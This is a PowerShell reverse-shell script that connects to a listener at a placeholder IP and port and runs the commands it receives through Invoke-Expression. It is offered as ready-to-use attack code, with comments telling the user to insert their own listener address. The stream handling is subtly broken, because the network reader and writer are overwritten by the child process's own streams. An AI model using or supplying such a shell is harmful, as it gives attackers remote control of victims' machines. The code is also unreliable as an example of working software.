# Replace the IP address and port below with your listener's IP and port
$ip = "192.168.23.158"
$port = 7777

# Create TCP client
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)

# Create stream
$stream = $client.GetStream()

# Create reader and writer objects
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Create a process object for PowerShell
$p = New-Object System.Diagnostics.Process
$p.StartInfo.FileName = "powershell"
$p.StartInfo.RedirectStandardInput = $true
$p.StartInfo.RedirectStandardOutput = $true
$p.StartInfo.UseShellExecute = $false
$p.Start()

# Create a StreamWriter to write to the process's standard input
$p.StandardInput.AutoFlush = $true
$writer = $p.StandardInput

# Create a StreamReader to read from the process's standard output
$reader = $p.StandardOutput

# Infinite loop to continuously read commands from the listener and execute them
while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq $null) {
        break
    }

    # Execute the command and send the output back to the listener
    $output = Invoke-Expression $command
    $writer.WriteLine($output)
}

# Close the TCP client and stream
$client.Close()
$stream.Close()
